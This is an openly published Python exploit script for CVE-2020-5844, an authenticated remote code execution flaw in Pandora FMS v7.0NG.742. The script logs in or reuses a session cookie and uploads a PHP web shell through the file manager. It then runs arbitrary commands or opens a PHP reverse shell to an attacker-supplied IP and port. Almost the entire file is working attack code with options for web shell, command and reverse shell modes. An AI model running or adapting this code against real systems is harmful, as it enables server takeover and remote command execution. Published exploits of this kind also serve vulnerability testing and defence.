# Exploit Title: Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)
# Date: 05/20/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://pandorafms.com/
# Software Link: https://sourceforge.net/projects/pandora/files/Pandora%20FMS%207.0NG/742_FIX_PERL2020/Tarball/pandorafms_server-7.0NG.742_FIX_PERL2020.tar.gz
# Version: v7.0NG.742
# Tested on: Pandora FMS v7.0NG.742 (Ubuntu)
# CVE: CVE-2020-5844
# Source: https://github.com/UNICORDev/exploit-CVE-2020-5844
# Description: index.php?sec=godmode/extensions&sec2=extensions/files_repo in Pandora FMS v7.0 NG allows authenticated administrators to upload malicious PHP scripts, and execute them via base64 decoding of the file location. This affects v7.0NG.742_FIX_PERL2020.

#!/usr/bin/env python3

# Imports
try:
    import requests
except:
    print(f"ERRORED: RUN: pip install requests")
    exit()
import sys
import time
import urllib.parse

# Class for colors
class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)

# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution

Usage:
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -u <username> <password>
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID>
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID> [-c <custom-command>]
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID> [-s <local-ip> <local-port>]
  python3 exploit-CVE-2020-5844.py -t <target-IP> <target-port> -p <PHPSESSID> [-w <name.php>]
  python3 exploit-CVE-2020-5844.py -h

Options:
  -t    Target host and port. Provide target IP address and port.
  -u    Target username and password. Provide username and password to log in to Pandora FMS.
  -p    Target valid PHP session ID. No username or password needed. (Optional)
  -s    Reverse shell mode. Provide local IP address and port. (Optional)
  -c    Custom command mode. Provide command to execute. (Optional)
  -w    Web shell custom mode. Provide custom PHP file name. (Optional)
  -h    Show this help menu.
""")
    exit()

# Pretty loading wheel
def loading(spins):

    def spinning_cursor():
        while True:
            for cursor in '|/-\\':
                yield cursor

    spinner = spinning_cursor()
    for _ in range(spins):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')

# Run the exploit
def exploit(exploitMode, targetSess):

    UNICORD_ASCII()

    # Print initial variables
    print(f"{color.blue}UNICORD: {color.red}Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution{color.no}")
    print(f"{color.blue}OPTIONS: {color.gold}{modes[exploitMode]}{color.no}")
    if targetSess is not None:
        print(f"{color.blue}PHPSESS: {color.gold}{targetSess}{color.no}")
    elif targetUser is not None:
        print(f"{color.blue}USERNAME: {color.gold}{targetUser}{color.no}")
        print(f"{color.blue}PASSWORD: {color.gold}{targetPass}{color.no}")

    if exploitMode == "command":
        print(f"{color.blue}COMMAND: {color.gold}{command}{color.no}")
    if exploitMode == "web":
        print(f"{color.blue}WEBFILE: {color.gold}{webName}{color.no}")
    if exploitMode == "shell":
        print(f"{color.blue}LOCALIP: {color.gold}{localIP}:{localPort}{color.no}")
        print(f"{color.blue}WARNING: {color.gold}Be sure to start a local listener on the above IP and port.{color.no}")
    print(f"{color.blue}WEBSITE: {color.gold}http://{targetIP}:{targetPort}/pandora_console{color.no}")

    loading(15)

    # If a PHPSESSID is not provided, grab one with valid username and password
    if targetSess is None:
        try:
            getSession = requests.post(f"http://{targetIP}:{targetPort}/pandora_console/index.php?login=1", data={"nick": targetUser, "pass": targetPass, "login_button": "login"})
            targetSess = getSession.cookies.get('PHPSESSID')
            print(f"{color.blue}PHPSESS: {color.gold}{targetSess}{color.no}")
            if "login_move" in getSession.text:
                print(f"{color.blue}ERRORED: {color.red}Invalid credentials!{color.no}")
        except:
            print(f"{color.blue}ERRORED: {color.red}Could not log in to website!{color.no}")
            exit()

    # Set headers, parameters, and cookies for post request
    headers = {
    'Host': f'{targetIP}',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------308045185511758964171231871874',
    'Content-Length': '1289',
    'Connection': 'close',
    'Referer': f'http://{targetIP}:{targetPort}/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1'
    }
    params = (
        ('sec', 'gsetup'),
        ('sec2', 'godmode/setup/file_manager')
    )
    cookies = {'PHPSESSID': targetSess}
    # Basic PHP web shell with 'cmd' parameter
    data = f'-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="{webName}"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[\'cmd\']);?>\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'

    # Try to upload the PHP web shell to the server
    try:
        response = requests.post(f'http://{targetIP}:{targetPort}/pandora_console/index.php', headers=headers, params=params, cookies=cookies, data=data, verify=False)
    except:
        print(f"{color.blue}ERRORED: {color.red}Could not connect to website!{color.no}")
        exit()
    statusCode=response.status_code
    if statusCode == 200:
        print(f"{color.blue}EXPLOIT: {color.gold}Connected to website! Status Code: {statusCode}{color.no}")
    else:
        print(f"{color.blue}ERRORED: {color.red}Could not connect to website! Status Code: {statusCode}{color.no}")
        exit()
    loading(15)

    print(f"{color.blue}EXPLOIT: {color.gold}Logged into Pandora FMS!{color.no}")
    loading(15)

    # Print web shell location if in web shell mode
    if exploitMode == "web":
        print(f"{color.blue}EXPLOIT: {color.gold}Web shell uploaded!{color.no}")
        print(f"{color.blue}SUCCESS: {color.green}Web shell available at: http://{targetIP}:{targetPort}/pandora_console/images/{webName}?cmd=whoami {color.no}\n")

    # Run custom command on web shell if in command mode
    if exploitMode == "command":
        response = requests.get(f'http://{targetIP}:{targetPort}/pandora_console/images/{webName}?cmd={urllib.parse.quote_plus(command)}')
        print(f"{color.blue}SUCCESS: {color.green}Command executed! Printing response below:{color.no}\n")
        print(response.text)

    # Run reverse shell command if in reverse shell mode
    if exploitMode == "shell":
        shell = f"php -r \'$sock=fsockopen(\"{localIP}\",{localPort});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'"
        try:
            requests.get(f'http://{targetIP}:{targetPort}/pandora_console/images/{webName}?cmd={urllib.parse.quote_plus(shell)}',timeout=1)
            print(f"{color.blue}ERRORED: {color.red}Reverse shell could not connect! Make sure you have a local listener on {color.gold}{localIP}:{localPort}{color.no}\n")
        except:
            print(f"{color.blue}SUCCESS: {color.green}Reverse shell executed! Check your local listener on {color.gold}{localIP}:{localPort}{color.no}\n")

    exit()

if __name__ == "__main__":

    args = ['-h','-t','-u','-p','-s','-c','-w']
    modes = {'web':'Web Shell Mode','command':'Command Shell Mode','shell':'Reverse Shell Mode'}

    # Initialize starting variables
    targetIP = None
    targetPort = None
    targetUser = None
    targetPass = None
    targetSess = None
    command = None
    localIP = None
    localPort = None
    webName = "unicord.php" # Default web shell file name
    exploitMode = "web" # Default to web shell mode

    # Print help if specified or if a target or authentication is not provided
    if args[0] in sys.argv or args[1] not in sys.argv or (args[2] not in sys.argv and args[3] not in sys.argv):
        help()

    # Collect target IP and port from CLI
    if args[1] in sys.argv:
        try:
            if "-" in sys.argv[sys.argv.index(args[1]) + 1]:
                raise
            targetIP = sys.argv[sys.argv.index(args[1]) + 1]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide a target port! \"-t <target-IP> <target-port>\"{color.no}")
            exit()
        try:
            if "-" in sys.argv[sys.argv.index(args[1]) + 2]:
                raise
            targetPort = sys.argv[sys.argv.index(args[1]) + 2]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide a target port! \"-t <target-IP> <target-port>\"{color.no}")
            exit()

    # Collect target username and password from  CLI
    if args[2] in sys.argv:
        try:
            if "-" in sys.argv[sys.argv.index(args[2]) + 1]:
                raise
            targetUser = sys.argv[sys.argv.index(args[2]) + 1]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide both a username and password! \"-u <username> <password>\"{color.no}")
            exit()
        try:
            if "-" in sys.argv[sys.argv.index(args[2]) + 2]:
                raise
            targetPass = sys.argv[sys.argv.index(args[2]) + 2]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide both a username and password! \"-u <username> <password>\"{color.no}")
            exit()

    # Collect PHPSESSID from CLI, if specified
    if args[3] in sys.argv:
        try:
            if "-" in sys.argv[sys.argv.index(args[3]) + 1]:
                raise
            targetSess = sys.argv[sys.argv.index(args[3]) + 1]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide a valid PHPSESSID! \"-p <PHPSESSID>\"{color.no}")
            exit()

    # Set reverse shell mode from CLI, if specified
    if args[4] in sys.argv:
        exploitMode = "shell"
        try:
            if "-" in sys.argv[sys.argv.index(args[4]) + 1]:
                raise
            localIP = sys.argv[sys.argv.index(args[4]) + 1]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide both a local IP address and port! \"-s <local-IP> <local-port>\"{color.no}")
            exit()
        try:
            if "-" in sys.argv[sys.argv.index(args[4]) + 2]:
                raise
            localPort = sys.argv[sys.argv.index(args[4]) + 2]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide both a local IP address and port! \"-s <local-IP> <local-port>\"{color.no}")
            exit()
        exploit(exploitMode,targetSess)

    # Set custom command mode from CLI, if specified
    elif args[5] in sys.argv:
        exploitMode = "command"
        try:
            if sys.argv[sys.argv.index(args[5]) + 1] in args:
                raise
            command = sys.argv[sys.argv.index(args[5]) + 1]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide a custom command! \"-c <command>\"{color.no}")
            exit()
        exploit(exploitMode,targetSess)

    # Set web shell mode from CLI, if specified
    elif args[6] in sys.argv:
        exploitMode = "web"
        try:
            if sys.argv[sys.argv.index(args[6]) + 1] in args:
                raise
            if ".php" not in sys.argv[sys.argv.index(args[6]) + 1]:
                webName = sys.argv[sys.argv.index(args[6]) + 1] + ".php"
            else:
                webName = sys.argv[sys.argv.index(args[6]) + 1]
        except:
            print(f"{color.blue}ERRORED: {color.red}Provide a custom PHP file name! \"-c <name.php>\"{color.no}")
            exit()
        exploit(exploitMode,targetSess)

    # Run with default web shell mode if no mode is specified
    else:
        exploit(exploitMode,targetSess)